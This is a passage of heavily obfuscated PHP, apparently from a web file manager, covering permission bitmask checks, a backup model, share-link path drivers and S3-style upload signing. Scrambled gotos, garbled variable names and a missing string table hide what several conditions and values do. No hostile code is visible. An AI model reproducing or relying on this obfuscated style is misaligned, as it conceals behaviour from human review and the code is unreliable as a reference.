$Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2131], $Eï‹ƒ«ŞÛØ[2125] => 3, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2133]), $Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2134], $Eï‹ƒ«ŞÛØ[2125] => 4, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => self::AUTH_SHOW | self::AUTH_VIEW), array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2135]), $Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2136], $Eï‹ƒ«ŞÛØ[2125] => 5, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Eï‹ƒ«ŞÛØ[386] => LNG($Eï‹ƒ«ŞÛØ[2137]), $Eï‹ƒ«ŞÛØ[2123] => $Eï‹ƒ«ŞÛØ[2138], $Eï‹ƒ«ŞÛØ[2125] => 7, $Eï‹ƒ«ŞÛØ[2126] => 1, $Eï‹ƒ«ŞÛØ[2127] => 0)); return $DÑ£Ú•‹×; } public static function authCheck($Bôáğ§ƒæà, $b‚Ä¤ùòì) { $Bôáğ§ƒæà = intval($Bôáğ§ƒæà); if (_get($GLOBALS, $_SERVER[¬ˆÚÂ”Éğä][459])) { return !0; } if ($Bôáğ§ƒæà <= 0) { return !1; } if (($Bôáğ§ƒæà & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Bôáğ§ƒæà & $b‚Ä¤ùòì); } public static function authCheckShow($F‚æÄñéË) { return self::authCheck($F‚æÄñéË, self::AUTH_SHOW); } public static function authCheckView($cæó—ƒïáÉ) { return self::authCheck($cæó—ƒïáÉ, self::AUTH_VIEW); } public static function authCheckDownload($BÑ™ºÊ„‹†) { return self::authCheck($BÑ™ºÊ„‹†, self::AUTH_DOWNLOAD); } public static function authCheckUpload($d«÷å†øÇ) { return self::authCheck($d«÷å†øÇ, self::AUTH_UPLOAD); } public static function authCheckEdit($féî×–…ËŠ) { return self::authCheck($féî×–…ËŠ, self::AUTH_EDIT); } public static function authCheckRemove($Eğ„ˆæ°Ì´) { return self::authCheck($Eğ„ˆæ°Ì´, self::AUTH_REMOVE); } public static function authCheckShare($E¤öÙñŠîÇ) { return self::authCheck($E¤öÙñŠîÇ, self::AUTH_SHARE); } public static function authCheckComment($AÆö£•»¿°) { return self::authCheck($AÆö£•»¿°, self::AUTH_COMMENT); } public static function authCheckEvent($A•ö¸àÒÌ) { return self::authCheck($A•ö¸àÒÌ, self::AUTH_EVENT); } public static function authCheckRoot($A‚ æ«ìÂÁ) { return self::authCheck($A‚ æ«ìÂÁ, self::AUTH_ROOT); } public static function authCheckAction($E›ˆõ¥êø›, $f°›¤õâØì) { goto fôƒ±…‘°Ë; CÚİšóñ¤‘: $FÕ„¿·£‘ = $A“œœˆè³«[$f°›¤õâØì]; $E›ˆõ¥êø› = intval($E›ˆõ¥êø›); if ($E›ˆõ¥êø› <= 0) { return !1; } goto EÃ¤•í«º; fôƒ±…‘°Ë: $B˜„ó¿Í£ =& $_SERVER[¬ˆÚÂ”Éğä]; $A“œœˆè³« = array($B˜„ó¿Í£[2139] => self::AUTH_VIEW, $B˜„ó¿Í£[1053] => self::AUTH_DOWNLOAD, $B˜„ó¿Í£[103] => self::AUTH_UPLOAD, $B˜„ó¿Í£[2088] => self::AUTH_EDIT, $B˜„ó¿Í£[2087] => self::AUTH_REMOVE, $B˜„ó¿Í£[2098] => self::AUTH_SHARE, $B˜„ó¿Í£[341] => self::AUTH_COMMENT, $B˜„ó¿Í£[1438] => self::AUTH_EVENT, $B˜„ó¿Í£[1576] => self::AUTH_ROOT); if (!isset($A“œœˆè³«[$f°›¤õâØì])) { return; } goto CÚİšóñ¤‘; EÃ¤•í«º: if (($E›ˆõ¥êø› & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($E›ˆõ¥êø› & $FÕ„¿·£‘); goto C¸Ú›Û—¤¦; C¸Ú›Û—¤¦: } public static function authDisable($d‚‹ˆäĞ¿‰, $BŠŒ©“«³¹) { if (intval($d‚‹ˆäĞ¿‰) <= 0) { return 0; } return intval($d‚‹ˆäĞ¿‰) & ~$BŠŒ©“«³¹; } public $optionType = "\x53\x79\x73\164\x65\155\56\163\x6f\165\x72\143\x65\101\165\x74\x68\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\141\165\x74\x68", "\x6c\x61\x62\x65\154", "\144\x69\163\x70\154\141\x79", "\163\171\163\164\x65\x6d", "\x73\157\162\164"); public function initData() { $B¨×Øì¥‘Š = $this->authDefault(); foreach ($B¨×Øì¥‘Š as $dÄÒ°·¦àø) { $this->add($dÄÒ°·¦àø); } } public function listData($C×¿®…Ê¦ = false, $E°ãä´×ñ = "\163\157\x72\164", $e®¿÷¥‘Ë˜ = false) { return parent::listData($C×¿®…Ê¦, $E°ãä´×ñ, $e®¿÷¥‘Ë˜); } public function update($E­¼–ô·âÖ, $Fƒèƒ±õù¸) { $FÕ“ƒ·á¸ =& $_SERVER[¬ˆÚÂ”Éğä]; $cî†Ö¾ùª„ = parent::listData($E­¼–ô·âÖ); $FĞÓªóè™« = $this->findByName($Fƒèƒ±õù¸[$FÕ“ƒ·á¸[28]]); if (!$cî†Ö¾ùª„ || $FĞÓªóè™« && $FĞÓªóè™«[$FÕ“ƒ·á¸[367]] != $cî†Ö¾ùª„[$FÕ“ƒ·á¸[367]]) { return !1; } $this->filterAuth($Fƒèƒ±õù¸[$FÕ“ƒ·á¸[376]]); return parent::update($E­¼–ô·âÖ, $Fƒèƒ±õù¸); } public function remove($C‰ƒ–öåë) { $D‹ã×“°µ = parent::listData($C‰ƒ–öåë); if (!$D‹ã×“°µ || $D‹ã×“°µ[$_SERVER[¬ˆÚÂ”Éğä][1093]]) { return !1; } return parent::remove($C‰ƒ–öåë); } public function add($BÊˆŒÙµ«á = array()) { goto DåéóØ¨¼; f¨Á˜æ‡µ: return parent::insert($BÊˆŒÙµ«á); goto bòÂñŠ†‡Ü; CÁ‹©ÌêÆÍ: $BÊˆŒÙµ«á = array_merge($FÈĞ£šÇŒ¾, $BÊˆŒÙµ«á); $BÊˆŒÙµ«á[$A³ÀåÓà°[2143]] = $this->getSort(); $this->filterAuth($BÊˆŒÙµ«á[$A³ÀåÓà°[376]]); goto f¨Á˜æ‡µ; DåéóØ¨¼: $A³ÀåÓà° =& $_SERVER[¬ˆÚÂ”Éğä]; if ($this->findByName($BÊˆŒÙµ«á[$A³ÀåÓà°[28]])) { return !1; } $FÈĞ£šÇŒ¾ = array($A³ÀåÓà°[28] => $A³ÀåÓà°[33], $A³ÀåÓà°[376] => 1, $A³ÀåÓà°[2140] => $A³ÀåÓà°[2141], $A³ÀåÓà°[2142] => 1, $A³ÀåÓà°[1093] => 0, $A³ÀåÓà°[2143] => 0); goto CÁ‹©ÌêÆÍ; bòÂñŠ†‡Ü: } private function getSort() { $AÓÓäÜ¯”Î =& $_SERVER[¬ˆÚÂ”Éğä]; $bÎ¢‘øßˆ = parent::listData(); $F¯Â¦®‚‘ = array_to_keyvalue($bÎ¢‘øßˆ, $AÓÓäÜ¯”Î[33], $AÓÓäÜ¯”Î[2143]); return empty($F¯Â¦®‚‘) ? 0 : max($F¯Â¦®‚‘) + 1; } private function filterAuth(&$C»¹İê¾Ø) { goto Eñœ½×òœù; Dˆ‡Ü÷¬ïÂ: foreach ($DªŠùÊ¦à as $cã·¼ïê“) { if (isset($E•˜µÊÅˆ[$cã·¼ïê“])) { $DªŠùÊ¦à = array_merge($DªŠùÊ¦à, $E•˜µÊÅˆ[$cã·¼ïê“]); } } $DªŠùÊ¦à[] = self::AUTH_SHOW; $C»¹İê¾Ø = array_sum(array_unique($DªŠùÊ¦à)); goto Eà¡„¾´Ÿ•; EøÃ”Åˆ³å: foreach ($f´°âÄÈÎï as $cã·¼ïê“) { if ($C»¹İê¾Ø & $cã·¼ïê“) { $DªŠùÊ¦à[] = $cã·¼ïê“; } } if (in_array(self::AUTH_ROOT, $DªŠùÊ¦à)) { $C»¹İê¾Ø = array_sum($f´°âÄÈÎï); return; } $E•˜µÊÅˆ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto Dˆ‡Ü÷¬ïÂ; Eñœ½×òœù: if (!$C»¹İê¾Ø) { return; } $f´°âÄÈÎï = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $DªŠùÊ¦à = array(); goto EøÃ”Åˆ³å; Eà¡„¾´Ÿ•: } public function sort($Eè‘¯´˜§à, $D¸í³´Î¨×) { return parent::update($Eè‘¯´˜§à, $D¸í³´Î¨×); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\142\141\143\x6b\165\160\x4c\151\163\164"; public $field = array("\151\157", "\156\141\155\x65", "\163\164\141\x74\165\x73", "\143\157\x6e\164\145\156\164", "\x72\x65\163\165\154\x74", "\x74\151\x6d\x65\x46\x72\157\155", "\x74\x69\155\145\x54\157"); public function config() { goto CìŞÁÚñö; BÚß­°“­­: $d¥Ğ‚ÎÙÃæ = is_array($d¥Ğ‚ÎÙÃæ) ? $d¥Ğ‚ÎÙÃæ : array(); if (!isset($d¥Ğ‚ÎÙÃæ[$A½¦à®Ÿ˜[700]])) { $d¥Ğ‚ÎÙÃæ[$A½¦à®Ÿ˜[700]] = $A½¦à®Ÿ˜[83]; } $f¯†’§„ŞÔ = array(); goto A‚ëè‰ñùÚ; A‚ëè‰ñùÚ: Action($A½¦à®Ÿ˜[2144])->taskInit(); $dİ®ĞÏéÕ = Model($A½¦à®Ÿ˜[2145])->listData(); foreach ($dİ®ĞÏéÕ as $cõ‡İ’Ú¤) { if ($cõ‡İ’Ú¤[$A½¦à®Ÿ˜[1093]] == $A½¦à®Ÿ˜[83] && $cõ‡İ’Ú¤[$A½¦à®Ÿ˜[1438]] == $A½¦à®Ÿ˜[2146]) { $f¯†’§„ŞÔ = $cõ‡İ’Ú¤; break; } } goto c¿ñ“¿‡†ƒ; c¿ñ“¿‡†ƒ: if (isset($f¯†’§„ŞÔ[$A½¦à®Ÿ˜[190]])) { $f¯†’§„ŞÔ[$A½¦à®Ÿ˜[190]] = json_decode($f¯†’§„ŞÔ[$A½¦à®Ÿ˜[190]], !0); } if (isset($d¥Ğ‚ÎÙÃæ[$A½¦à®Ÿ˜[190]])) { $f¯†’§„ŞÔ[$A½¦à®Ÿ˜[190]][$A½¦à®Ÿ˜[1425]] = $d¥Ğ‚ÎÙÃæ[$A½¦à®Ÿ˜[190]]; unset($d¥Ğ‚ÎÙÃæ[$A½¦à®Ÿ˜[190]]); } return array_merge($f¯†’§„ŞÔ, $d¥Ğ‚ÎÙÃæ); goto D£ì—¡õ·; CìŞÁÚñö: $A½¦à®Ÿ˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $d¥Ğ‚ÎÙÃæ = Model($A½¦à®Ÿ˜[1101])->get($A½¦à®Ÿ˜[721]); $d¥Ğ‚ÎÙÃæ = json_decode($d¥Ğ‚ÎÙÃæ, !0); goto BÚß­°“­­; D£ì—¡õ·: } public function listData($C ÒÙ³È·¢ = false, $dâ‘…®ÂÛœ = "\x6d\157\x64\x69\x66\171\x54\151\x6d\x65", $d…ˆ–ƒ¥…Ü = false) { return parent::listData($C ÒÙ³È·¢, $dâ‘…®ÂÛœ, !0); } public function lastItem() { $f¿ÆÅéçÂ„ = $this->listData(); return !empty($f¿ÆÅéçÂ„[0]) ? $f¿ÆÅéçÂ„[0] : null; } public function kill($b‹÷äëšÂ¿) { goto a…‰¦–ˆ…Ù; E©¹ÁìÔ³: return $this->remove($b‹÷äëšÂ¿); goto càº½ÙÇ·; b‘·ƒöªÒƒ: Task::kill($b÷ô­…÷İ¡[720]); Task::kill($b÷ô­…÷İ¡[736]); Task::kill($b÷ô­…÷İ¡[744]); goto eªŸ–©Ÿßß; a…‰¦–ˆ…Ù: $b÷ô­…÷İ¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $cÎ£â´ÔÄ’ = $this->listData($b‹÷äëšÂ¿); if (!$cÎ£â´ÔÄ’ || empty($cÎ£â´ÔÄ’[$b÷ô­…÷İ¡[28]])) { return !0; } goto b‘·ƒöªÒƒ; eªŸ–©Ÿßß: $BÙ¦‚šœ» = $cÎ£â´ÔÄ’[$b÷ô­…÷İ¡[28]]; $BÑ´Ñ…°²ç = TEMP_FILES . $b÷ô­…÷İ¡[717] . $BÙ¦‚šœ» . $b÷ô­…÷İ¡[8]; IO::remove($BÑ´Ñ…°²ç, !1); goto E©¹ÁìÔ³; càº½ÙÇ·: } public function remove($AÇĞÄ´ÛĞ) { $fÏ‹­Æ‚‚Œ = $this->listData($AÇĞÄ´ÛĞ); if (!$fÏ‹­Æ‚‚Œ) { return !0; } return $this->backupRemove($fÏ‹­Æ‚‚Œ); } private function backupRemove($d„èƒÂ¡è) { $F²ÔÜí„©Ğ =& $_SERVER[¬ˆÚÂ”Éğä]; parent::remove($d„èƒÂ¡è[$F²ÔÜí„©Ğ[367]]); $b†Î·ìíåŒ = "\173\x69\157\72{$d„èƒÂ¡è[$F²ÔÜí„©Ğ[699]]}\175\x2f\x64\x61\x74\x61\142\x61\x73\x65\x2f\142\x61\143\153\165\160\137" . $d„èƒÂ¡è[$F²ÔÜí„©Ğ[28]]; IO::remove($b†Î·ìíåŒ, !1); return !0; } public function start() { goto c¬÷„¼Ş¶¥; A‰÷ƒ¸ã–Ñ: $eİÀÊ‰Ø = new Backup(); $eİÀÊ‰Ø->keep(); if (!$eİÀÊ‰Ø->db()) { return !1; } goto b°ãóÑö¢­; B«´ ÕÎ”ö: return !0; goto Bªø²Ä‰ÂÚ; EŞÓåâ÷Ş‚: if (!$CÆµËÚõ¥ || $CÆµËÚõ¥[$aŒˆ‚«®ˆ¦[1422]] != $aŒˆ‚«®ˆ¦[83]) { return !1; } $dÖÙ¬°à„í = $this->process(); foreach ($dÖÙ¬°à„í as $bö£êÈ„³”) { if ($bö£êÈ„³”) { return Task::restart($bö£êÈ„³”[$aŒˆ‚«®ˆ¦[367]]); } } goto A‰÷ƒ¸ã–Ñ; b°ãóÑö¢­: if (!$eİÀÊ‰Ø->dbFile()) { return !1; } if ($CÆµËÚõ¥[$aŒˆ‚«®ˆ¦[700]] == $aŒˆ‚«®ˆ¦[470]) { $eİÀÊ‰Ø->file(); } Backup::set(array($aŒˆ‚«®ˆ¦[697] => 1, $aŒˆ‚«®ˆ¦[449] => time())); goto B«´ ÕÎ”ö; c¬÷„¼Ş¶¥: $aŒˆ‚«®ˆ¦ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($GLOBALS[$aŒˆ‚«®ˆ¦[6]][$aŒˆ‚«®ˆ¦[84]][$aŒˆ‚«®ˆ¦[2147]] != $aŒˆ‚«®ˆ¦[83]) { return !0; } $CÆµËÚõ¥ = $this->config(); goto EŞÓåâ÷Ş‚; Bªø²Ä‰ÂÚ: } public function process() { $Aé´ø¶ÍÉ¬ =& $_SERVER[¬ˆÚÂ”Éğä]; return array($Aé´ø¶ÍÉ¬[702] => Task::get($Aé´ø¶ÍÉ¬[720]), $Aé´ø¶ÍÉ¬[705] => Task::get($Aé´ø¶ÍÉ¬[736]), $Aé´ø¶ÍÉ¬[167] => Task::get($Aé´ø¶ÍÉ¬[744])); } public function restore() { $c¿’Ñ‘Æ® =& $_SERVER[¬ˆÚÂ”Éğä]; ActionCall($c¿’Ñ‘Æ®[986], !0, 1); ActionCall($c¿’Ñ‘Æ®[986], !0, 0); } } goto Fƒ­ïŞ›ãÉ; eäµ¯¡ÄÑ±: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ağ–ÉÔˆ¿¨) { $this->pathParse = $Ağ–ÉÔˆ¿¨; $this->model = Model($_SERVER[¬ˆÚÂ”Éğä][1130]); } protected function infoParse($e‘Ÿª”ù‚‚, $d©Š™ô¿¥Ú = false, $bÊ«œæÀì = false) { $BÂ‘Àµùä¸ =& $_SERVER[¬ˆÚÂ”Éğä]; return Action($BÂ‘Àµùä¸[1031])->sharePathInfo($this->pathParse[$BÂ‘Àµùä¸[75]], !0); } public function listPath($AæŒ¦æ†’¿, $Dê»ß­ºãÒ = false) { $FĞÃ¦—’¦ =& $_SERVER[¬ˆÚÂ”Éğä]; $d‡ÁàªÛµ¬ = parent::listPath($AæŒ¦æ†’¿, $Dê»ß­ºãÒ); foreach ($d‡ÁàªÛµ¬ as $A´Í°ì¸Ù­ => $bè¦ğ¯Îğ…) { if (!in_array($A´Í°ì¸Ù­, array($FĞÃ¦—’¦[73], $FĞÃ¦—’¦[74]))) { continue; } foreach ($bè¦ğ¯Îğ… as $fÆ¶âÕ³´‰ => $b†‡ËóÁÆ¼) { $d‡ÁàªÛµ¬[$A´Í°ì¸Ù­][$fÆ¶âÕ³´‰] = Action($FĞÃ¦—’¦[1031])->shareItemInfo($b†‡ËóÁÆ¼); } } return $d‡ÁàªÛµ¬; } public function listAll($aÌ®Ä¿æ¾) { goto d°Ë­â„êæ; CŠ­ê¹™¥ì: return $bÂá«ôé¿×; goto EØÈË…ĞÂ‹; d°Ë­â„êæ: $CÒ…ğÅ¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $dŒ­âêÉğæ = IO::info($this->pathParse[$CÒ…ğÅ¡[75]]); if (!$dŒ­âêÉğæ) { return array(); } goto AßÇÒ¶¬ª‰; AßÇÒ¶¬ª‰: $bÂá«ôé¿× = $this->model->listAll($aÌ®Ä¿æ¾); foreach ($bÂá«ôé¿× as &$bº÷›øç’Ë) { $bº÷›øç’Ë[$CÒ…ğÅ¡[391]] = Action($CÒ…ğÅ¡[1031])->shareItemInfo($bº÷›øç’Ë[$CÒ…ğÅ¡[391]]); } unset($bº÷›øç’Ë); goto CŠ­ê¹™¥ì; EØÈË…ĞÂ‹: } } class PathDriverDriverShareItem { public function __construct($eª°­Ø×²°) { $this->pathParse = $eª°­Ø×²°; } public function __call($AÎ—±¼İ¦í, $DŸÂÏÃé) { $e±óãÆ°‚§ =& $_SERVER[¬ˆÚÂ”Éğä]; if (method_exists($this, $AÎ—±¼İ¦í)) { return; } $fùÅí–õ‚ã = call_user_func_array(array($e±óãÆ°‚§[1138], $AÎ—±¼İ¦í), $DŸÂÏÃé); $Fİ¯ğ˜‘Á = array($e±óãÆ°‚§[1139], $e±óãÆ°‚§[1140], $e±óãÆ°‚§[1141], $e±óãÆ°‚§[1142], $e±óãÆ°‚§[492], $e±óãÆ°‚§[494], $e±óãÆ°‚§[1143], $e±óãÆ°‚§[103], $e±óãÆ°‚§[1144], $e±óãÆ°‚§[1145]); if (in_array($AÎ—±¼İ¦í, $Fİ¯ğ˜‘Á)) { $fùÅí–õ‚ã = $this->getPathOuter($fùÅí–õ‚ã); } return $fùÅí–õ‚ã; } public function copy($C“É–Ô¨Ï, $CÖ¡·¶×‚æ, $b¿¥„Ø²ùå = false) { return $this->copyMove($C“É–Ô¨Ï, $CÖ¡·¶×‚æ, $b¿¥„Ø²ùå, $_SERVER[¬ˆÚÂ”Éğä][492]); } public function move($fùÔë… ØÕ, $a«ÙÕ®ÙÖ¹, $FãÖ½¢ôêÌ = false) { return $this->copyMove($fùÔë… ØÕ, $a«ÙÕ®ÙÖ¹, $FãÖ½¢ôêÌ, $_SERVER[¬ˆÚÂ”Éğä][494]); } private function copyMove($föß‘ì±³, $d“¤­ğ¯‰•, $CµÚöÚÕÆ, $dˆŸÏ–ÜÏÙ) { goto aÃÂÔ»¬²; FªÎ¾ÛºŸ‘: if ($aàğÌÄÖŒ->pathParse[$fƒß¡ƒ‡ÈŒ[1011]]) { $d“¤­ğ¯‰• = $aàğÌÄÖŒ->pathParse[$fƒß¡ƒ‡ÈŒ[1011]]; } else { $d“¤­ğ¯‰• = $c²ØÙÒË÷š; } $e‡è·²¤° = IO::copyMove($föß‘ì±³, $d“¤­ğ¯‰•, $CµÚöÚÕÆ, $dˆŸÏ–ÜÏÙ); $e‡è·²¤° = $this->getPathOuter($e‡è·²¤°); goto c·ÉÇœÕ—; aÃÂÔ»¬²: $fƒß¡ƒ‡ÈŒ =& $_SERVER[¬ˆÚÂ”Éğä]; $c²ØÙÒË÷š = $d“¤­ğ¯‰•; $aàğÌÄÖŒ = IO::driverMake($d“¤­ğ¯‰•); goto FªÎ¾ÛºŸ‘; c·ÉÇœÕ—: return $e‡è·²¤°; goto F×Š–ˆ¦ù; F×Š–ˆ¦ù: } public function pathFather($F‡„Èß¿ÇÖ) { return get_path_father($this->pathParse[$_SERVER[¬ˆÚÂ”Éğä][75]]); } public function iconvSystem($BÃ¦é¦¹º©) { return $BÃ¦é¦¹º©; } protected function infoParse($cÙÑ«³¤Ç•, $F¹Ñ’ß„Å» = false) { $f·òó†öˆ­ =& $_SERVER[¬ˆÚÂ”Éğä]; $AÚÆ«ãİ¯› = $this->pathParse[$f·òó†öˆ­[439]][$f·òó†öˆ­[1032]] . $this->pathParse[$f·òó†öˆ­[1025]]; if ($F¹Ñ’ß„Å») { $Bå¢½¢÷õ = IO::infoWithChildren($AÚÆ«ãİ¯›); } else { $Bå¢½¢÷õ = IO::info($AÚÆ«ãİ¯›); } $FÛƒäÖ¡ÃÖ = $this->pathParse[$f·òó†öˆ­[439]]; return Action($f·òó†öˆ­[1137])->_shareItemeParse($Bå¢½¢÷õ, $FÛƒäÖ¡ÃÖ); } public function listAll($eØÖ¼³ÛÂ) { $C©‘™Í†™¿ =& $_SERVER[¬ˆÚÂ”Éğä]; $e¢ò¹ÎçÈ˜ = IO::listAll($eØÖ¼³ÛÂ); $cñ­ò©¢¿ğ = $this->pathParse[$C©‘™Í†™¿[439]]; foreach ($e¢ò¹ÎçÈ˜ as &$D†ñ£Œ•ê·) { check_abort(); $D†ñ£Œ•ê· = array_merge(IO::info($D†ñ£Œ•ê·[$C©‘™Í†™¿[75]]), $D†ñ£Œ•ê·); $D†ñ£Œ•ê·[$C©‘™Í†™¿[391]] = Action($C©‘™Í†™¿[1137])->_shareItemeParse($D†ñ£Œ•ê·, $cñ­ò©¢¿ğ); } unset($D†ñ£Œ•ê·); return $e¢ò¹ÎçÈ˜; } public function getPathOuter($cŠ»öä¢Î») { goto D”ŠŒÎ—–Ş; AÌàÍôæ¸: $A¡³ªœø¨ = KodIO::clear($cŠ»öä¢Î»); $f‰«ÔÎ‡ = KodIO::clear($this->pathParse[$DĞÙÒĞİëò[439]][$DĞÙÒĞİëò[1032]]); $EŸÙâšö‹ğ = substr($A¡³ªœø¨, strlen($f‰«ÔÎ‡)); goto BÚ´´»Ôçİ; D”ŠŒÎ—–Ş: $DĞÙÒĞİëò =& $_SERVER[¬ˆÚÂ”Éğä]; $C›ÓÇŒ¾ä¾ = KodIO::parse($cŠ»öä¢Î»); if ($C›ÓÇŒ¾ä¾[$DĞÙÒĞİëò[29]] == KodIO::KOD_SHARE_ITEM) { return $C›ÓÇŒ¾ä¾[$DĞÙÒĞİëò[75]]; } goto AÌàÍôæ¸; BÚ´´»Ôçİ: if (substr($A¡³ªœø¨, 0, strlen($f‰«ÔÎ‡)) != $f‰«ÔÎ‡) { return !1; } return $this->pathParse[$DĞÙÒĞİëò[1026]] . $DĞÙÒĞİëò[8] . ltrim($EŸÙâšö‹ğ, $DĞÙÒĞİëò[8]); goto c¼§å¤Â·”; c¼§å¤Â·”: } public function getType() { $B„ç™•Î¤÷ =& $_SERVER[¬ˆÚÂ”Éğä]; $fá¯“¬©ÚÍ = str_replace($B„ç™•Î¤÷[71], $B„ç™•Î¤÷[33], get_class($this)); return strtolower($fá¯“¬©ÚÍ); } public function isTypeObject($Dº»Ô¿×È–) { return IO::isTypeObject($Dº»Ô¿×È–); } public function info($Eˆšê‘Œ˜) { return $this->infoParse($Eˆšê‘Œ˜); } public function infoAuth($Fã„“Äåá×) { return $this->infoParse($Fã„“Äåá×); } public function infoWithChildren($BĞë„Š·˜Ü) { return $this->infoParse($BĞë„Š·˜Ü, !0); } public function infoFull($f¹î”Ô·) { return $this->infoParse($f¹î”Ô·); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($a´×É¸ñàÛ) { $this->pathParse = $a´×É¸ñàÛ; } protected function infoParse($C‰˜ğƒÜƒù, $f§ŠÊªÁµ = false) { $d›¬•™£ÃÓ =& $_SERVER[¬ˆÚÂ”Éğä]; return Action($d›¬•™£ÃÓ[1031])->sharePathInfo($this->pathParse[$d›¬•™£ÃÓ[75]], !0, $f§ŠÊªÁµ); } public function listPath($AšğÏˆÃ£Ş, $cµø­“ƒ­‰ = false) { $E“ù½¨‰ĞÓ =& $_SERVER[¬ˆÚÂ”Éğä]; $Cïˆ·”ÅÚŸ = IO::listPath($AšğÏˆÃ£Ş, $cµø­“ƒ­‰); foreach ($Cïˆ·”ÅÚŸ as $f¤õä¸øÜà => $cÜß¢ïàÔ) { if (!in_array($f¤õä¸øÜà, array($E“ù½¨‰ĞÓ[73], $E“ù½¨‰ĞÓ[74]))) { continue; } foreach ($cÜß¢ïàÔ as $e±ÂÔ‰Â => $F—ÔÂ–¡È) { $F—ÔÂ–¡È = Action($E“ù½¨‰ĞÓ[1146])->parsePathChildren($F—ÔÂ–¡È, array($E“ù½¨‰ĞÓ[387] => $AšğÏˆÃ£Ş)); $Cïˆ·”ÅÚŸ[$f¤õä¸øÜà][$e±ÂÔ‰Â] = Action($E“ù½¨‰ĞÓ[1031])->shareItemInfo($F—ÔÂ–¡È); } } return $Cïˆ·”ÅÚŸ; } public function listAll($a¦—¥ÛÄˆ) { $a÷ÜŠå±³ =& $_SERVER[¬ˆÚÂ”Éğä]; $BªŸ¸Öª = IO::listAll($a¦—¥ÛÄˆ); foreach ($BªŸ¸Öª as &$DŒÕÙ´¬´) { $DŒÕÙ´¬´ = array_merge(IO::info($DŒÕÙ´¬´[$a÷ÜŠå±³[75]]), $DŒÕÙ´¬´); $DŒÕÙ´¬´[$a÷ÜŠå±³[391]] = Action($a÷ÜŠå±³[1031])->shareItemInfo($DŒÕÙ´¬´); } unset($DŒÕÙ´¬´); return $BªŸ¸Öª; } } goto BÖÙ¯¤èÃß; BÖÙ¯¤èÃß: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($CÙ…·›³­Ô) { parent::__construct($CÙ…·›³­Ô); $this->signatureVersion($_SERVER[¬ˆÚÂ”Éğä][200]); } public function uploadFormData($A½î¥¥êŒ„, $cŒ½ô¡êà² = 3600) { goto Fœ»˜ˆˆŞº; Fœ»˜ˆˆŞº: $BÓÈõœîÕ =& $_SERVER[¬ˆÚÂ”Éğä]; $B·£¢ÊÖÕ = $BÓÈõœîÕ[185]; $AÕë«®¦öÃ = $BÓÈõœîÕ[1147]; goto f´‘Öá×Ì; CóÁ“á…åˆ: $Càá—É´¥ = array($BÓÈõœîÕ[199] => $BÓÈõœîÕ[33], $BÓÈõœîÕ[1159] => $BÓÈõœîÕ[33], $BÓÈõœîÕ[1117] => $B·£¢ÊÖÕ, $BÓÈõœîÕ[1121] => $E¼ê‰Üøàˆ, $BÓÈõœîÕ[1125] => $FõÕÁò¤­½, $BÓÈõœîÕ[1160] => $C–Òˆ„İ†¶, $BÓÈõœîÕ[1161] => $AÕë«®¦öÃ, $BÓÈõœîÕ[1162] => $FÁÇšŸ«, $BÓÈõœîÕ[1163] => $c¯—ÁäÙ¡º, $BÓÈõœîÕ[1164] => $aÆ³ÏÌÀáÄ, $BÓÈõœîÕ[169] => $this->getHost()); return $Càá—É´¥; goto fö¹áîæ·; F§¡ñ´ç: $FõÕÁò¤­½ = base64_encode(json_encode($DÊËæÓç®Ø)); $F‚–½œ…ŒŸ = hash_hmac($BÓÈõœîÕ[1157], $f“Âç‹Ëò, $BÓÈõœîÕ[1158] . $this->secret, !0); $fÕ‘Ãßğ©… = hash_hmac($BÓÈõœîÕ[1157], $this->region, $F‚–½œ…ŒŸ, !0); goto b‹Ä–•Ù; b‹Ä–•Ù: $bÎ˜ÃÒ¸ä¸ = hash_hmac($BÓÈõœîÕ[1157], $f¯Ÿäˆ§, $fÕ‘Ãßğ©…, !0); $a†—ÉßÇ»… = hash_hmac($BÓÈõœîÕ[1157], $b’µ³Ç­Ÿ¬, $bÎ˜ÃÒ¸ä¸, !0); $aÆ³ÏÌÀáÄ = hash_hmac($BÓÈõœîÕ[1157], $FõÕÁò¤­½, $a†—ÉßÇ»…); goto CóÁ“á…åˆ; f´‘Öá×Ì: $f¯Ÿäˆ§ = $BÓÈõœîÕ[59]; $FÁÇšŸ« = gmdate($BÓÈõœîÕ[1148]); $f“Âç‹Ëò = gmdate($BÓÈõœîÕ[698]); goto aÑ±¼ÌÃ; aÑ±¼ÌÃ: $b’µ³Ç­Ÿ¬ = $BÓÈõœîÕ[1149]; $c¯—ÁäÙ¡º = $cŒ½ô¡êà² . $BÓÈõœîÕ[33]; $E¼ê‰Üøàˆ = $BÓÈõœîÕ[1113]; goto 